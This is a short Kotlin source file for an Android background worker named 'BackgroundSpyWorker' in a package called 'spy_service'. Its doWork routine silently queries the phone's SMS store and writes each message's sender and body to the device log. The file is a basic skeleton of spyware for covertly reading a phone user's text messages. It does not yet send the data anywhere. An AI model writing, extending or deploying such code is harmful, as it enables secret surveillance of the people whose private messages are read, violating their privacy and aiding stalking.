package com.example.spy_service

import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.util.Log
import androidx.work.Worker
import androidx.work.WorkerParameters


class BackgroundSpyWorker(appContext: Context, workerParams: WorkerParameters)
    : Worker(appContext, workerParams) {
    private val TAG = "SPY_TAG"
    private val SMS_URI = Uri.parse("content://sms")
    override fun doWork(): Result {
        return try {
            readSmsData()
            Log.d(TAG, "success work")
            Result.success()
        } catch (e: Exception) {
            Log.d(TAG, "exception occurred: ", e)
            Result.failure()
        }
    }

    private fun readSmsData() {
        val context = applicationContext
        val cursor: Cursor? = context.contentResolver.query(SMS_URI, null, null, null, null)
        cursor?.use {
            if (cursor.moveToFirst()) {
                do {
                    val sender: String = cursor.getString(cursor.getColumnIndexOrThrow("address"))
                    val messageBody: String = cursor.getString(cursor.getColumnIndexOrThrow("body"))
                    Log.d("SMS_DATA", "Sender: $sender, Message: $messageBody")

                } while (cursor.moveToNext())
            }
        }
    }
}